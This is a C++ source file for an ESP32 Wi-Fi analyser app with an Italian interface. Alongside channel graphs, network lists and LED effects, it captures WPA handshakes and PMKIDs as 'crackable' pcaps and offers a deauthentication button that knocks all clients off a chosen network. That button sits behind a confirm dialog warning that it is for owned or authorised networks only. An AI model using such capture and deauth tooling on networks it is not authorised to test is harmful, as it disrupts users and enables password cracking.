void sendDeauthBurst(const uint8_t*, const uint8_t*) {}
void sendDeauthBurstOnChannel(const uint8_t*, int) {}

#endif // ESP_PLATFORM

/** A handshake is worth saving once we have M1+M2 (enough to crack) or a PMKID. Called from the
 * app timer (not the RX callback): copies one ready capture out under the lock, then writes it to
 * SD outside the lock so the slow card I/O never blocks packet reception. */
void flushHandshakes(Context* ctx) {
#ifdef ESP_PLATFORM
    auto ready = std::make_unique<HandshakeCapture>();
    uint64_t key = 0;
    bool have = false;
    bool beep = false;
    if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
        for (auto& [k, hc] : ctx->handshakes) {
            bool crackable = ((hc.msgMask & 0x03) == 0x03) || hc.hasPmkid; // M1+M2, or PMKID
            // `saved` is re-armed by every new message (M3/M4 arriving after M1+M2), so it can't
            // gate the beep too - that fired a second eapolSoundTask moments after the first,
            // racing it for the Music service's state and killing the audible beep. `beepFired`
            // is set once and never reset, so this fires exactly once per handshake.
            if (crackable && !hc.beepFired) {
                hc.beepFired = true;
                beep = true;
            }
            if (crackable && !hc.saved && !have) {
                *ready = hc;
                key = k;
                hc.saved = true;
                have = true;
            }
        }
        ctx->mutex.unlock();
    }
    if (beep) triggerEapolSound();
    if (have) {
        if (savePcap(*ready, key)) {
            if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
                ctx->handshakesSaved++;
                ctx->mutex.unlock();
            }
        }
    }
#else
    (void)ctx;
#endif
}

// ---- Formatting helpers ----

const char* authToString(WifiAuthenticationType type) {
    switch (type) {
        case WIFI_AUTHENTICATION_TYPE_OPEN: return "OPEN";
        case WIFI_AUTHENTICATION_TYPE_WEP: return "WEP";
        case WIFI_AUTHENTICATION_TYPE_WPA_PSK: return "WPA";
        case WIFI_AUTHENTICATION_TYPE_WPA2_PSK: return "WPA2";
        case WIFI_AUTHENTICATION_TYPE_WPA_WPA2_PSK: return "WPA/2";
        case WIFI_AUTHENTICATION_TYPE_WPA2_ENTERPRISE: return "WPA2-E";
        case WIFI_AUTHENTICATION_TYPE_WPA3_PSK: return "WPA3";
        case WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK: return "WPA2/3";
        default: return "?";
    }
}

/** Color-codes the list/detail by how open the network is; open is deliberately red, not green. */
uint32_t securityColor(WifiAuthenticationType type) {
    switch (type) {
        case WIFI_AUTHENTICATION_TYPE_OPEN: return 0xE53935;
        case WIFI_AUTHENTICATION_TYPE_WEP: return 0xFB8C00;
        case WIFI_AUTHENTICATION_TYPE_WPA_PSK: return 0xFDD835;
        case WIFI_AUTHENTICATION_TYPE_WPA2_PSK: return 0x7CB342;
        case WIFI_AUTHENTICATION_TYPE_WPA_WPA2_PSK: return 0x43A047;
        case WIFI_AUTHENTICATION_TYPE_WPA2_ENTERPRISE: return 0x1E88E5;
        case WIFI_AUTHENTICATION_TYPE_WPA3_PSK: return 0x8E24AA;
        case WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK: return 0x3949AB;
        default: return 0x757575;
    }
}

const char* cipherToString(WifiCipherType cipher) {
    switch (cipher) {
        case WIFI_AP_CIPHER_NONE: return "nessuna";
        case WIFI_AP_CIPHER_WEP: return "WEP";
        case WIFI_AP_CIPHER_TKIP: return "TKIP";
        case WIFI_AP_CIPHER_CCMP: return "CCMP (AES)";
        case WIFI_AP_CIPHER_TKIP_CCMP: return "TKIP+CCMP";
        case WIFI_AP_CIPHER_GCMP: return "GCMP";
        default: return "sconosciuta (solo cattura)";
    }
}

std::string phyToString(uint8_t flags) {
    std::string result;
    if (flags & WIFI_AP_PHY_11B) result += "b";
    if (flags & WIFI_AP_PHY_11G) result += "g";
    if (flags & WIFI_AP_PHY_11N) result += "n";
    if (flags & WIFI_AP_PHY_11AX) result += "ax";
    if (flags & WIFI_AP_PHY_WPS) result += " WPS";
    return result.empty() ? "?" : ("802.11" + result);
}

std::string macToString(const uint8_t* mac) {
    char text[18];
    snprintf(text, sizeof(text), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return text;
}

const char* displaySsid(const WifiApRecord& record) {
    return record.ssid[0] != '\0' ? record.ssid : "(nascosta)";
}

int frequencyMhz(int channel) { return 2407 + 5 * channel; }

float estimateDistanceMeters(int8_t rssi) {
    constexpr float txPowerAt1m = -40.0f;
    constexpr float pathLossExponent = 2.5f;
    return std::pow(10.0f, (txPowerAt1m - (float)rssi) / (10.0f * pathLossExponent));
}

bool isRadioUsable() {
    using enum service::wifi::RadioState;
    auto state = service::wifi::getRadioState();
    return state == On || state == ConnectionPending || state == ConnectionActive;
}

// ---- Shared state helpers ----

void connectTo(Context* ctx, const std::string& ssid) {
    service::wifi::settings::WifiApSettings settings;
    if (service::wifi::settings::load(ssid, settings)) {
        LOG_I(TAG, "Connecting with known credentials");
        service::wifi::connect(settings, false);
    } else {
        wificonnect::start(ssid);
    }
    (void)ctx;
}

/** Fills one bell-curve series centered on the given channel/RSSI. */
void fillBell(lv_obj_t* chart, lv_chart_series_t* series, int channel, int8_t rssi) {
    int32_t values[CHART_POINTS];
    int32_t height = std::clamp<int32_t>(rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
    float step = (CH_AXIS_MAX - CH_AXIS_MIN) / (CHART_POINTS - 1);
    for (int i = 0; i < CHART_POINTS; i++) {
        float x = CH_AXIS_MIN + step * i;
        float distance = std::fabs(x - (float)channel) / BELL_HALF_WIDTH;
        // 0 outside the bell (not POINT_NONE) so the curve sits on the zero baseline and the bell
        // rises from it, instead of floating with gaps at the edges.
        values[i] = distance < 1.0f ? (int32_t)(height * (1.0f - distance * distance)) : 0;
    }
    lv_chart_set_series_values(chart, series, values, CHART_POINTS);
}

/** Snapshot of ctx->seen as a vector sorted by signal strength, with stale rows dropped.
 * Must be called with ctx->mutex held. */
std::vector<SeenAp> sortedByRssi(Context* ctx) {
    std::vector<SeenAp> result;
    uint64_t now = nowMs();
    for (auto it = ctx->seen.begin(); it != ctx->seen.end();) {
        if (now - it->second.lastSeenMs > ROW_EXPIRY_MS) {
            it = ctx->seen.erase(it);
        } else {
            result.push_back(it->second);
            ++it;
        }
    }
    std::sort(result.begin(), result.end(), [](const SeenAp& a, const SeenAp& b) {
        return a.record.rssi > b.record.rssi;
    });
    return result;
}

/** Merges fresh active-scan results into ctx->seen. Must be called with ctx->mutex held. */
void mergeActiveScan(Context* ctx, const std::vector<WifiApRecord>& records) {
    uint64_t now = nowMs();
    for (const auto& record : records) {
        uint64_t key = bssidKey(record.bssid);
        auto it = ctx->seen.find(key);
        if (it == ctx->seen.end()) {
            SeenAp ap{};
            ap.record = record;
            ap.firstSeenMs = now;
            ap.lastSeenMs = now;
            ap.rssiMin = ap.rssiMax = record.rssi;
            ap.colorIndex = ctx->nextColor++ % MAX_SERIES;
            ctx->seen.emplace(key, ap);
        } else {
            SeenAp& ap = it->second;
            ap.record = record; // the active scan is authoritative over our capture heuristics
            ap.fromCapture = false;
            ap.lastSeenMs = now;
            ap.rssiMin = std::min(ap.rssiMin, record.rssi);
            ap.rssiMax = std::max(ap.rssiMax, record.rssi);
        }
    }
}

// ---- LED strip (NeoPixel) feedback ----

void saveLedConfig(Context* ctx) {
    namespace np = service::neopixel;
    ctx->savedAnim = np::getActiveAnimation();
    ctx->savedColorMode = np::getActiveColorMode();
    np::getActiveColor(&ctx->savedR, &ctx->savedG, &ctx->savedB);
    ctx->savedBrightness = np::getActiveBrightness();
    ctx->savedSpeed = np::getActiveSpeed();
    ctx->savedVuActive = np::isVuActive();
    ctx->savedVuDecay = np::isVuDecayEnabled();
    ctx->savedVuAutoGain = np::isVuAutoGainEnabled();
    ctx->savedVuBeatFlash = np::isVuBeatFlashEnabled();
    ctx->savedVuPeakHold = np::isVuPeakHoldEnabled();
    ctx->savedVuPalette = np::getVuPalette();
    ctx->savedVuOrigin = np::getVuOrigin();
    np::getVuColor(&ctx->savedVuR, &ctx->savedVuG, &ctx->savedVuB);
    ctx->savedVuBrightness = np::getVuBrightness();
    ctx->savedVuSensitivity = np::getVuSensitivity();
    ctx->ledSaved = true;
}

void restoreLedConfig(Context* ctx) {
    namespace np = service::neopixel;
    if (!ctx->ledSaved) return;
    // Put the VU meter back the way the user had it, then the Active-stage animation.
    np::setVuPalette(ctx->savedVuPalette);
    np::setVuOrigin(ctx->savedVuOrigin);
    np::setVuColor(ctx->savedVuR, ctx->savedVuG, ctx->savedVuB);
    np::setVuBrightness(ctx->savedVuBrightness);
    np::setVuSensitivity(ctx->savedVuSensitivity);
    np::setVuDecayEnabled(ctx->savedVuDecay);
    np::setVuAutoGainEnabled(ctx->savedVuAutoGain);
    np::setVuBeatFlashEnabled(ctx->savedVuBeatFlash);
    np::setVuPeakHoldEnabled(ctx->savedVuPeakHold);
    np::setVuActive(ctx->savedVuActive);
    np::setActiveColorMode(ctx->savedColorMode);
    np::setActiveColor(ctx->savedR, ctx->savedG, ctx->savedB);
    np::setActiveSpeed(ctx->savedSpeed);
    np::setActiveBrightness(ctx->savedBrightness);
    np::setActiveAnimation(ctx->savedAnim);
}

/** Drives the strip from the current page/mode/selection. Caches what was last pushed so the
 * animation isn't restarted on every 1 s refresh; only real changes are applied. */
void updateLeds(Context* ctx) {
    namespace np = service::neopixel;

    Page page;
    RadioMode mode;
    uint64_t selectedKey;
    if (ctx->mutex.lock(0)) {
        page = ctx->page;
        mode = ctx->mode;
        selectedKey = ctx->selectedKey;
        ctx->mutex.unlock();
    } else {
        return;
    }

    // The proximity bar is shown both in a network's detail and in its clients page.
    if (page == Page::Detail || page == Page::Clients) {
        int colorIdx = 0;
        int8_t rssi = SIGNAL_FLOOR_DBM;
        bool found = false;
        if (ctx->mutex.lock(0)) {
            auto it = ctx->seen.find(selectedKey);
            if (it != ctx->seen.end()) {
                colorIdx = it->second.colorIndex % MAX_SERIES;
                rssi = it->second.record.rssi;
                found = true;
            }
            ctx->mutex.unlock();
        }
        if (!found) return;

        // Borrow the VU meter to draw a proximity bar: the strip fills up like an equaliser, in
        // the network's colour, more LEDs lit the closer (stronger) the AP is. Fed fast and
        // continuously by ledTimer (so it never blinks).
        if (ctx->ledViewApplied != 3) {
            np::setVuPalette(np::VuPalette::Solid);
            np::setVuOrigin(np::VuOrigin::BothLeft);
            np::setVuDecayEnabled(true);      // the swell at each refresh eases back down
            np::setVuAutoGainEnabled(false);  // our mapping is already the full scale
            np::setVuBeatFlashEnabled(false);
            np::setVuPeakHoldEnabled(true);   // the bright peak dot that lingers at the recent max
            np::setVuPeakBrightness(90);
            np::setVuSensitivity(100);        // show the whole range we feed
            np::setVuBrightness(ctx->savedBrightness != 0 ? ctx->savedBrightness : 70);
            np::setVuActive(true);
            ctx->vuFeeding.store(true);
            ctx->ledViewApplied = 3;
            ctx->ledColorApplied = -1;
        }
        if (ctx->ledColorApplied != colorIdx) {
            uint32_t color = SERIES_COLORS[colorIdx];
            np::setVuColor((color >> 16) & 0xFF, (color >> 8) & 0xFF, color & 0xFF);
            ctx->ledColorApplied = colorIdx;
        }
        // Map signal to bar length: far (floor) -> empty, near -> full. ledTimer feeds this value
        // and adds a short "breath" swell at each refresh (vuRefreshTick marks when a fresh reading
        // arrived). The peak dot then lingers at the swell's top, so you see if it was closer before.
        int32_t peak = std::clamp<int32_t>(rssi - SIGNAL_FLOOR_DBM, 0, SIGNAL_RANGE_DB);
        ctx->vuLevel.store((int)(peak * 255 / SIGNAL_RANGE_DB));
        ctx->vuRefreshTick.store((uint32_t)lv_tick_get());
        return;
    }

    // Leaving the proximity view: stop feeding and hand the meter back before the mode animation.
    if (ctx->ledViewApplied == 3) {
        ctx->vuFeeding.store(false);
        np::setVuActive(false);
    }

    // Graph / list: the strip reflects the capture state.
    int view = mode == RadioMode::Capture ? 1 : (mode == RadioMode::ActiveScan ? 0 : 2);
    if (ctx->ledViewApplied == view) return;
    ctx->ledViewApplied = view;
    ctx->ledColorApplied = -1;

    if (view == 2) { // stopped -> put the user's own lighting back
        restoreLedConfig(ctx);
        return;
    }

    // A slow sonar wave running back and forth: green for active scan, red for channel hopping.
    np::setActiveColorMode(np::ColorMode::Static);
    if (view == 0) np::setActiveColor(0, 255, 0);
    else np::setActiveColor(255, 0, 0);
    np::setActiveSpeed(2); // low = slow, so it glides rather than flickering
    np::setActiveAnimation(np::Animation::Scanner);
}

// ---- Forward declarations ----

void showPage(Context* ctx, Page page);
void updateViews(Context* ctx);

// ---- Graph page ----

void updateGraph(Context* ctx, const std::vector<SeenAp>& aps) {
    if (ctx->chart == nullptr) return;

    lv_obj_clean(ctx->labelLayer);
    int chartWidth = lv_obj_get_width(ctx->chart);
    int chartHeight = lv_obj_get_height(ctx->chart);

    // Draw the strongest networks into consecutive series slots (so none overwrite each other),
    // recolouring each slot to that network's stable colour so its bell matches its list colour-bar.
    int drawn = 0;
    for (const auto& ap : aps) {
        if (drawn >= MAX_SERIES) break;
        if (ap.record.channel < 1 || ap.record.channel > 13) continue;

        uint32_t color = SERIES_COLORS[ap.colorIndex % MAX_SERIES];
        lv_chart_set_series_color(ctx->chart, ctx->series[drawn], lv_color_hex(color));
        fillBell(ctx->chart, ctx->series[drawn], ap.record.channel, ap.record.rssi);
        lv_chart_hide_series(ctx->chart, ctx->series[drawn], false);

        auto* label = lv_label_create(ctx->labelLayer);
        lv_label_set_text(label, displaySsid(ap.record));
        lv_obj_set_style_text_color(label, lv_color_hex(color), 0);
        lv_obj_update_layout(label);
        int width = lv_obj_get_width(label);
        int height = lv_obj_get_height(label);

        // X: centered on the bell's peak (same fraction as the channel number / reference line).
        int xPx = (int)(chartWidth * channelFraction(ap.record.channel)) - width / 2;
        if (xPx < 0) xPx = 0;
        if (xPx + width > chartWidth) xPx = chartWidth - width;

        // Y: just above the peak, so each name sits on its own curve inside the chart. The peak
        // height mirrors fillBell: clamp(rssi - floor, 1, range), with y=0 at the top of the chart.
        int32_t peak = std::clamp<int32_t>(ap.record.rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
        int yPx = chartHeight - (chartHeight * peak / SIGNAL_RANGE_DB);
        yPx -= height; // sit the text just above the peak instead of on top of it
        if (yPx < 0) yPx = 0;
        if (yPx + height > chartHeight) yPx = chartHeight - height;

        lv_obj_set_pos(label, xPx, yPx);
        drawn++;
    }
    for (int i = drawn; i < MAX_SERIES; i++) {
        lv_chart_hide_series(ctx->chart, ctx->series[i], true);
    }
}

void onSelectFromList(lv_event_t* event);

void onShowList(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::List);
}

/** Reflects ctx->mode on the three mode buttons: each is disabled while it's the active mode. */
void refreshModeButtons(Context* ctx) {
    RadioMode mode;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        mode = ctx->mode;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (ctx->scanButton != nullptr) {
        if (mode == RadioMode::ActiveScan) lv_obj_add_state(ctx->scanButton, LV_STATE_DISABLED);
        else lv_obj_remove_state(ctx->scanButton, LV_STATE_DISABLED);
    }
    if (ctx->captureButton != nullptr) {
        if (mode == RadioMode::Capture || !isCaptureSupported()) lv_obj_add_state(ctx->captureButton, LV_STATE_DISABLED);
        else lv_obj_remove_state(ctx->captureButton, LV_STATE_DISABLED);
    }
    if (ctx->stopButton != nullptr) {
        if (mode == RadioMode::Stopped) lv_obj_add_state(ctx->stopButton, LV_STATE_DISABLED);
        else lv_obj_remove_state(ctx->stopButton, LV_STATE_DISABLED);
    }
}

void setMode(Context* ctx, RadioMode mode) {
    RadioMode previous;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        previous = ctx->mode;
        ctx->mode = mode;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (previous == RadioMode::Capture && mode != RadioMode::Capture) stopCapture(ctx);
    if (mode == RadioMode::Capture) startCapture(ctx);
    refreshModeButtons(ctx);

    // Stopped freezes the views (updateViews returns early), so set the status text here;
    // nothing else will.
    if (mode == RadioMode::Stopped) {
        lvgl_lock();
        if (ctx->statusLabel != nullptr) lv_label_set_text(ctx->statusLabel, "Capture stopped");
        lvgl_unlock();
    }

    updateLeds(ctx);
}

void onStartScan(lv_event_t* event) {
    setMode(static_cast<Context*>(lv_event_get_user_data(event)), RadioMode::ActiveScan);
}

void onStartCapture(lv_event_t* event) {
    setMode(static_cast<Context*>(lv_event_get_user_data(event)), RadioMode::Capture);
}

void onStop(lv_event_t* event) {
    setMode(static_cast<Context*>(lv_event_get_user_data(event)), RadioMode::Stopped);
}

void updateDetail(Context* ctx);

// "Cattura mirata": park the radio on the selected network's channel so a full 4-way handshake
// (or PMKID) lands on us instead of being missed while hopping. Second tap releases the lock.
void onToggleLock(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    // Read the channel cached at selection time, not a live ctx->seen lookup: if this AP hasn't
    // been re-heard in 20s it has aged out of ctx->seen (see ROW_EXPIRY_MS), and a live lookup
    // here would fail silently, leaving the radio parked forever with no way to release it.
    int channel = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        channel = ctx->detailChannel;
        ctx->mutex.unlock();
    }
    if (channel < 1 || channel > 13) return;

    bool nowLocked = getCaptureLockChannel() != channel;
    if (nowLocked) {
        // Locking implies capturing: if we're only scanning (or stopped), switch to capture first
        // so the hop task is actually running and able to park.
        if (ctx->mode != RadioMode::Capture) setMode(ctx, RadioMode::Capture);
        setCaptureLockChannel(channel);
    } else {
        setCaptureLockChannel(0); // release: resume hopping, still capturing
    }
    updateDetail(ctx);
    updateLeds(ctx);
}

// Deauth is destructive (it disconnects a real client), so it always goes through a confirm
// dialog rather than firing on tap - the actual send happens in appMain() once the dialog's
// APP_EVENT_RESULT comes back confirmed.
void onDeauthPressed(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    char ssid[33] = {};
    bool found = false;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) {
            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
            found = true;
        }
        ctx->mutex.unlock();
    }
    if (!found) return;

    char message[160];
    snprintf(message, sizeof(message),
        "Invia deauth a TUTTI i client di \"%s\"?\nSolo su reti/dispositivi tuoi o autorizzati.",
        ssid[0] != '\0' ? ssid : "(nascosta)");
    ctx->deauthDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Deauth", message, { "Invia", "Annulla" });
}

void onShowClients(lv_event_t* event);

// ---- List page ----

void onSelectFromList(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    // The network key is 64-bit but a pointer on the ESP32-S3 is only 32-bit, so it can't be
    // smuggled through lv_obj user_data (it would be truncated and the lookup would miss). Find
    // the key by matching the clicked row against ctx->rows instead.
    lv_obj_t* row = lv_event_get_current_target_obj(event);
    uint64_t key = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        for (const auto& [k, w] : ctx->rows) {
            if (w == row) { key = k; break; }
        }
        ctx->selectedKey = key;
        auto it = ctx->seen.find(key);
        ctx->detailBeaconBaseline = it != ctx->seen.end() ? it->second.packetCount : 0;
        ctx->detailChannel = it != ctx->seen.end() ? (int)it->second.record.channel : 0;
        ctx->mutex.unlock();
    }
    if (key != 0) showPage(ctx, Page::Detail);
}

constexpr int LIST_ROW_HEIGHT = 30;
constexpr int COL_CH = 34;
constexpr int COL_POWER = 56;
constexpr int COL_SEC = 56;
constexpr int COL_CLI = 30;

lv_obj_t* addFieldLabel(lv_obj_t* row, int width) {
    auto* label = lv_label_create(row);
    lv_obj_set_width(label, width);
    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_RIGHT, 0);
    lv_label_set_long_mode(label, LV_LABEL_LONG_MODE_CLIP);
    return label;
}

/** A row is an lv_list button (so the badge up/down keys can focus it and scroll the list). One
 * single line: [colour bar][SSID — fills the middle, scrolls like a bus sign if too long][ch]
 * [power][security][clients], each later field in its own fixed-width column. */
lv_obj_t* createListRow(Context* ctx, uint64_t key) {
    auto* row = lv_list_add_button(ctx->list, nullptr, "");
    lv_obj_clean(row); // drop the empty label lv_list_add_button created, we lay the row out ourselves
    lv_obj_set_height(row, LIST_ROW_HEIGHT);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(row, 2, 0);
    lv_obj_set_style_pad_column(row, 4, 0);
    (void)key; // identity is tracked via ctx->rows, not user_data (see onSelectFromList)
    lv_obj_add_event_cb(row, onSelectFromList, LV_EVENT_CLICKED, ctx);

    // Colour bar (same colour as this network's bell on the graph), hard left.
    auto* chip = lv_obj_create(row);
    lv_obj_set_size(chip, 6, LV_PCT(90));
    lv_obj_set_style_radius(chip, 2, 0);
    lv_obj_set_style_border_width(chip, 0, 0);
    lv_obj_set_style_pad_all(chip, 0, 0);
    lv_obj_remove_flag(chip, LV_OBJ_FLAG_SCROLLABLE);

    // SSID, fills the middle, scrolls when longer than its space.
    auto* name = lv_label_create(row);
    lv_label_set_long_mode(name, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
    lv_obj_set_flex_grow(name, 1);

    addFieldLabel(row, COL_CH);     // child 2: channel
    addFieldLabel(row, COL_POWER);  // child 3: power
    addFieldLabel(row, COL_SEC);    // child 4: security
    addFieldLabel(row, COL_CLI);    // child 5: client count

    return row;
}

/** Updates rows in place. New networks are appended at the end and existing rows keep their place
 * (no re-sorting), so the selection doesn't jump while you scroll. */
void updateRows(Context* ctx, const std::vector<SeenAp>& aps, const std::map<uint64_t, int>& clientCounts) {
    if (ctx->list == nullptr) return;

    std::vector<uint64_t> keys;
    for (const auto& ap : aps) keys.push_back(bssidKey(ap.record.bssid));

    for (auto it = ctx->rows.begin(); it != ctx->rows.end();) {
        if (std::find(keys.begin(), keys.end(), it->first) == keys.end()) {
            lv_obj_delete(it->second);
            it = ctx->rows.erase(it);
        } else {
            ++it;
        }
    }

    for (const auto& ap : aps) {
        uint64_t key = bssidKey(ap.record.bssid);
        lv_obj_t* row = nullptr;
        auto it = ctx->rows.find(key);
        if (it == ctx->rows.end()) {
            row = createListRow(ctx, key); // appended at the end of the list
            ctx->rows[key] = row;
        } else {
            row = it->second;
        }

        auto* chip = lv_obj_get_child(row, 0);
        lv_obj_set_style_bg_color(chip, lv_color_hex(SERIES_COLORS[ap.colorIndex % MAX_SERIES]), 0);
        lv_obj_set_style_bg_opa(chip, LV_OPA_COVER, 0);

        char ssidLine[48];
        snprintf(ssidLine, sizeof(ssidLine), "%s%s", displaySsid(ap.record), ap.fromCapture ? " *" : "");
        lv_label_set_text(lv_obj_get_child(row, 1), ssidLine);

        // Plain numbers only; the legend header above the list says what each column is. The middle
        // column shows total beacons/frames seen for this network (dBm is in the detail instead).
        char channelText[16];
        char beaconText[16];
        snprintf(channelText, sizeof(channelText), "%d", (int)ap.record.channel);
        snprintf(beaconText, sizeof(beaconText), "%u", (unsigned)ap.packetCount);
        lv_label_set_text(lv_obj_get_child(row, 2), channelText);
        lv_label_set_text(lv_obj_get_child(row, 3), beaconText);
        lv_label_set_text(lv_obj_get_child(row, 4), authToString(ap.record.authentication_type));

        auto countIt = clientCounts.find(key);
        int count = countIt != clientCounts.end() ? countIt->second : 0;
        char cliText[12] = "";
        if (count > 0) snprintf(cliText, sizeof(cliText), "%d", count);
        lv_label_set_text(lv_obj_get_child(row, 5), cliText);
    }
}

// ---- Detail page ----

void onConnectPressed(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    std::string ssid;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) ssid = it->second.record.ssid;
        ctx->mutex.unlock();
    }
    if (!ssid.empty()) connectTo(ctx, ssid);
}

void updateDetail(Context* ctx) {
    if (ctx->detailInfo == nullptr) return;

    SeenAp ap{};
    bool found = false;
    uint32_t beaconBaseline = 0;
    int clientCount = 0;
    bool hsPresent = false, hsHas[4] = {}, hsPmkid = false, hsSaved = false;
    int deauthBursts = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) {
            ap = it->second;
            found = true;
            beaconBaseline = ctx->detailBeaconBaseline;
            for (const auto& [clientKey, client] : ctx->clients) {
                if (client.associatedBssid == ctx->selectedKey) clientCount++;
            }
            auto hit = ctx->handshakes.find(ctx->selectedKey);
            if (hit != ctx->handshakes.end()) {
                hsPresent = true;
                for (int s = 0; s < 4; s++) hsHas[s] = (hit->second.msgMask & (1 << s)) != 0;
                hsPmkid = hit->second.hasPmkid;
                hsSaved = hit->second.saved;
            }
        }
        deauthBursts = ctx->deauthBurstsSent;
        ctx->mutex.unlock();
    }
    if (!found) return;

    uint64_t now = nowMs();
    const char* vendor = lookupVendor(ap.record.bssid);
    uint32_t beaconsSinceOpen = ap.packetCount >= beaconBaseline ? ap.packetCount - beaconBaseline : 0;

    char text[768];
    int offset = snprintf(text, sizeof(text),
        "SSID: %s\n"
        "MAC: %s (%s)\n"
        "Sicurezza: %s\n",
        displaySsid(ap.record), macToString(ap.record.bssid).c_str(),
        vendor != nullptr ? vendor : "fornitore sconosciuto",
        authToString(ap.record.authentication_type));

    // The passive capture can only guess the cipher from beacon IEs, so show the exact cipher
    // only for networks the active scan actually measured.
    if (!ap.fromCapture) {
        offset += snprintf(text + offset, sizeof(text) - offset, "Cifratura: %s\n",
            cipherToString(ap.record.pairwise_cipher));
    }

    offset += snprintf(text + offset, sizeof(text) - offset,
        "Canale: %d (%d MHz)\n"
        "Potenza: %d dBm (min %d / max %d)\n"
        "Distanza stimata: %.1f m\n"
        "PHY: %s\n"
        "Fonte: %s\n"
        "Beacon ricevuti (da apertura): %u\n"
        "Visto da %u s, ultimo %u s fa\n",
        (int)ap.record.channel, frequencyMhz((int)ap.record.channel),
        (int)ap.record.rssi, (int)ap.rssiMin, (int)ap.rssiMax, estimateDistanceMeters(ap.record.rssi),
        phyToString(ap.record.phy_flags).c_str(), ap.fromCapture ? "cattura passiva" : "scansione attiva",
        (unsigned)beaconsSinceOpen,
        (unsigned)((now - ap.firstSeenMs) / 1000), (unsigned)((now - ap.lastSeenMs) / 1000));

    if (ap.record.country[0] != '\0') {
        offset += snprintf(text + offset, sizeof(text) - offset, "Paese: %.2s\n", ap.record.country);
    }

    // Handshake status for this network (the whole point of the capture, shown under the clients).
    if (hsPresent) {
        offset += snprintf(text + offset, sizeof(text) - offset, "Handshake: %s%s%s%s%s%s\n",
            hsHas[0] ? "M1 " : "", hsHas[1] ? "M2 " : "", hsHas[2] ? "M3 " : "", hsHas[3] ? "M4 " : "",
            hsPmkid ? "+PMKID " : "", hsSaved ? "-> salvato su SD" : "(parziale)");
    } else {
        offset += snprintf(text + offset, sizeof(text) - offset,
            "Handshake: nessuno (in cattura, serve che un client si (ri)connetta)\n");
    }

    if (deauthBursts > 0) {
        offset += snprintf(text + offset, sizeof(text) - offset,
            "Deauth inviati: %d\n", deauthBursts);
    }
    lv_label_set_text(ctx->detailInfo, text);

    // Compact HS/PMKID count right under Deauth, so a glance tells you if it caught anything -
    // the full M1..M4 breakdown above is still there for when you need the detail.
    if (ctx->detailHsSummary != nullptr) {
        int hsCount = (hsHas[0] ? 1 : 0) + (hsHas[1] ? 1 : 0) + (hsHas[2] ? 1 : 0) + (hsHas[3] ? 1 : 0);
        char hsSummary[48];
        snprintf(hsSummary, sizeof(hsSummary), "HS: %d/4%s   PMKID: %s",
            hsCount, (hsPresent && hsSaved) ? " (salvato)" : "", hsPmkid ? "si" : "no");
        lv_label_set_text(ctx->detailHsSummary, hsSummary);
    }

    // Clients live on their own page now; the button just shows how many and opens it.
    if (ctx->detailClientsButton != nullptr) {
        char buttonText[32];
        snprintf(buttonText, sizeof(buttonText), "Client associati (%d)", clientCount);
        lv_obj_t* label = lv_obj_get_child(ctx->detailClientsButton, lv_obj_get_child_count(ctx->detailClientsButton) - 1);
        if (label != nullptr) lv_label_set_text(label, buttonText);
    }

    // Lock button reflects whether we're parked on THIS network's channel.
    if (ctx->detailLockButton != nullptr) {
        bool lockedHere = getCaptureLockChannel() == (int)ap.record.channel && ap.record.channel >= 1;
        char lockText[48];
        if (lockedHere) {
            snprintf(lockText, sizeof(lockText), "Cattura mirata ATTIVA (ch %d)", (int)ap.record.channel);
        } else {
            snprintf(lockText, sizeof(lockText), "Cattura mirata su ch %d", (int)ap.record.channel);
        }
        lv_obj_t* label = lv_obj_get_child(ctx->detailLockButton, lv_obj_get_child_count(ctx->detailLockButton) - 1);
        if (label != nullptr) lv_label_set_text(label, lockText);
    }
}

// ---- Clients page (all devices seen by the passive capture, Kismet-style) ----

constexpr int CLIENT_ROW_HEIGHT = 30;
constexpr int COL_CDBM = 46;
constexpr int COL_TX = 46;
constexpr int COL_RX = 46;

/** Same row shape as the networks list: [MAC (scrolls if long)][dBm][TX][RX]. */
lv_obj_t* createClientRow(Context* ctx) {
    auto* row = lv_list_add_button(ctx->clientsList, nullptr, "");
    lv_obj_clean(row);
    lv_obj_set_height(row, CLIENT_ROW_HEIGHT);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(row, 2, 0);
    lv_obj_set_style_pad_column(row, 4, 0);

